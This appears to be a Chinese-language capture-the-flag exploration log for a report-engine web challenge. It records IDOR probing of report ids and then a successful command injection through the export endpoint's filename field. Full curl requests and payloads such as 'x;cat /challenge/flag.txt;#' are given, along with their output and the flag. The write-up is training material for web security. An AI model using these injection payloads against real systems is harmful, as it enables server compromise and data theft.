# a-09 · 探索记录

对应题解：[`a-09.md`](./a-09.md)。

## 目标与起点

题目说「报表引擎，严格权限控制，普通用户只能看自己的报表」，要求拿到管理员的私有报表。中等难度，300 分。

首页是登录/注册，前端 `assets/js/auth.js` 用 `api.php?action=login|register`。

## 第一阶段：注册 & 找接口

注册 `u_test1/pass1234` → 登录 → `dashboard.php` 200，加载 `assets/js/dashboard.js`。

从 JS 拿到四个接口：

```
api.php?action=reports
api.php?action=report&id=
api.php?action=create_report
api.php?action=export
```

## 第二阶段：IDOR 遍历（拿到「存在但无权」）

`action=reports` 返回一条公开报表（id=2，owner=admin）。然后遍历 id：

| id | 响应 | 判断 |
| --- | --- | --- |
| 1 | `无权访问此报表` | **存在，私有** |
| 2 | 正常 | 公开 |
| 3 | `无权访问此报表` | 存在，别人的私有 |
| 4–15 | `报表不存在` | 不存在 |

`id=1` 显然就是题目说的「管理员私有报表」。接下来试绕过：

| 尝试 | 结果 |
| --- | --- |
| `id=01` / `id=1 ` / `id=1.0` | 无权 / 不存在，无变化 |
| `id[]=1` | 无权 |
| `id=1&id=2`（参数重复） | 无权 |
| `id=-1` | 报表不存在 |

**结论：详情接口的权限判断是严格的服务端比较，没有类型/参数绕过。** 这一支没有继续挖（虽然理论上还能试 session 伪造等，但成本高）。

## 第三阶段：导出接口（转折）

按 JS 的 `exportReport()`，导出是 multipart POST：

```
report_id=<id>&filename=report&format=txt
```

先用 JSON 试了一次，返回 `{"error":"无效的报表ID"}` —— 说明它只读 `$_POST`（form-data），不读 JSON。换成 multipart：

```bash
curl -b cj -X POST -F 'report_id=2' -F 'filename=rep' -F 'format=txt' \
  'http://$T/api.php?action=export'
```

返回里有一个 **`debug`** 字段：

```json
{"success":true,
 "file":"/uploads/rep.txt",
 "debug":{"command":"echo '报表标题: 季度财务报表\n...' > /var/www/html/uploads/rep.txt 2>&1",
          "output":""}}
```

**服务端把拼好的命令直接回显了。** `filename` 落在 `> /var/www/html/uploads/{filename}.txt 2>&1`，没有引号。

顺带确认权限检查在导出里同样生效：

```bash
report_id=1 → {"error":"无权导出此报表"}
```

## 第四阶段：命令注入

按 `debug.command` 的上下文设计 payload：

| filename | `output` | 结论 |
| --- | --- | --- |
| `x;id;#` | `uid=33(www-data) gid=33(www-data)` | `;` 断句生效，`#` 注释掉 `.txt 2>&1` |
| `x;cat /challenge/flag.txt;#` | `flag{a4bb8e3c-f71b-460c-9503-ab98604d6221}` | 读完 |

最终请求：

```bash
curl -s -b cj -X POST -F 'report_id=2' \
  --form-string 'filename=x;cat /challenge/flag.txt;#' \
  -F 'format=txt' 'http://$T/api.php?action=export'
```

`--form-string` 是为了让 `;`、`#` 原样发送，不被 curl 当作表单语法。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `action=report&id=1` | 无权 | 服务端权限比较，无参数绕过 |
| `id=01` / `id=1.0` / `id[]=1` / 重复 id | 无权或不存在 | 同上 |
| 导出用 JSON body | `无效的报表ID` | 只读 `$_POST` |
| 导出 `report_id=1` | `无权导出此报表` | 权限检查同样存在 |
| **`filename=x;id;#`** | **`uid=33(www-data)`** | 命令注入成立 |
| **`filename=x;cat /challenge/flag.txt;#`** | **flag** | 读完 |

## 这次真正的收获

1. **「无权」≠「不存在」**。前者说明记录在、只是被挡住，是 IDOR 的信号；后者才是 id 错了。
2. **导出的 `debug` 字段等于把注入点标好了。** 看到 `command` 回显，先读拼接方式再构造 payload，不要盲猜分隔符。
3. **越权和命令注入是两条独立的路。** 权限检查只挡 `report_id`，不挡 `filename`；用自己的记录过校验、在文件名里注入，比硬绕权限便宜得多。
4. **multipart 字段要原样发送。** `curl -F` 会把 `;`/`#` 当表单分隔符，`--form-string` 才能原样送出。
5. **`;...;#` 骨架适用于所有「参数拼进重定向命令」的场景**：本例尾部是 `.txt 2>&1`，`#` 正好注释掉。
